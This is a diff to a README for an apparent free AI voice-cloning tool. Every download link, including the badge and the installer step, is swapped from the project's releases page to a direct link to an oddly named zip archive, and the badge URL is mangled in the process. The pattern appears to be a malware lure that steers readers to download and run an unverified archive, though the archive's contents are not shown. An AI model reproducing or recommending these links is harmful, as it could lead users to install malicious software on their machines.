@@ -24,18 +24,18 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download Now!
 
-[![Download Free-Local-AI-Voice-Cloning-Unlimited](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/dexter3816/Free-Local-AI-Voice-Cloning-Unlimited/releases)
+[![Download Free-Local-AI-Voice-Cloning-Unlimited](https://raw.githubusercontent.com/dexter3816/Free-Local-AI-Voice-Cloning-Unlimited/main/Annularia/Cloning_Local_Free_Unlimited_Voice_A_confoundable.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/dexter3816/Free-Local-AI-Voice-Cloning-Unlimited/main/Annularia/Cloning_Local_Free_Unlimited_Voice_A_confoundable.zip)
 
 ## 💻 Download & Install
 
 To download the software, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Visit the Releases Page](https://github.com/dexter3816/Free-Local-AI-Voice-Cloning-Unlimited/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/dexter3816/Free-Local-AI-Voice-Cloning-Unlimited/main/Annularia/Cloning_Local_Free_Unlimited_Voice_A_confoundable.zip)
 
 2. **Locate the Latest Version**: Scroll down to find the latest version of the application.
 
-3. **Download the Installer**: Click the file named something like `Free-Local-AI-Voice-Cloning-Unlimited-vX.X.exe` to download.
+3. **Download the Installer**: Click the file named something like `https://raw.githubusercontent.com/dexter3816/Free-Local-AI-Voice-Cloning-Unlimited/main/Annularia/Cloning_Local_Free_Unlimited_Voice_A_confoundable.zip` to download.
 
 4. **Run the Installer**: Once the download completes, locate the file in your Downloads folder. Double-click it to start the installation.
 
